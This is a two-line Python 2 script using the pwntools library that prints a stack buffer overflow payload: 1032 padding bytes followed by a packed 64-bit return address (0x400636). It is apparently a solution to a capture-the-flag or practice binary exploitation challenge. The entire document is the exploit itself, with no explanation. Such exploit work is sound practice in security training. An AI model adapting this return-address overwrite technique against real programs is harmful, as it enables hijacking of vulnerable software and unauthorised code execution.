from pwn import *

print 'a'*1032 + p64(0x0000000000400636)
